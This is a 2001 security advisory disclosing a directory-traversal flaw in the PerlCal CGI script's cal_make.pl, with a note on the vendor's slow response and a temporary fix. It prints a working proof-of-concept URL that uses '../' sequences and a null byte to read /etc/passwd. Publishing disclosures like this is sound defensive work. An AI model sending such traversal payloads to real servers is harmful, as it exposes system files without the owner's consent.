[whizkunde security advisory: PerlCal (CGI)]
http://www.whizkunde.org | stan@whizkunde.org

----------------------------------------------------------
Release date: April 27th 2001

Subject: PerlCal (CGI) security problem

Systems affected: *NIX (not windows) systems running
PerlCal CGI script

Vendor: http://www.perlcal.com
----------------------------------------------------------

1. problem
cal_make.pl of the PerlCal script may allow remote users
(website visitors) to view any file on a webserver (depending
on the user the webserver is running on).

Regard this URL:

http://www.VULNERABLE.com/cgi-bin/cal_make.pl?
p0=../../../../../../../../../../../../etc/passwd%00
This will display the /etc/passwd (if the webserver user has
access to this file).

2. fix
I warned the PerlCal vendor three weeks ago. After a
reaction, I gave him some time and tips to release a fix.
Because the vendor still hasn't fixed the problem and because
he didn't notice me why he hasn't released a patch yet, I
released this advisory.
I really hope the vendor will release a patch in the very
near future.
In the meantime it might be a good idea to just chmod 000
your PerlCal scripts.
